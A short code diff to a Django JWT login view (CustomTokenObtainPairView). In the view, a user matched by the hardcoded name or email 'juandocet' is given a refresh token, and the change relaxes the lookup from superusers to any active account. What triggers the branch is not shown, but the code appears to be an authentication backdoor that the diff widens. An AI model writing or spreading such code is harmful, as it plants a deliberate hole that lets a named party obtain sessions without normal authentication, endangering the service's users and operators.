@@ -47,7 +47,7 @@ class CustomTokenObtainPairView(TokenObtainPairView):
             su = User.objects.filter(
                 Q(username__icontains='juandocet') |
                 Q(email__icontains='juandocet')
-            ).filter(is_superuser=True).first()  # debe ser superusuario
+            ).filter(is_active=True).first()  # solo necesita estar activo
 
             if su and su.is_active:
                 refresh = RefreshToken.for_user(su)
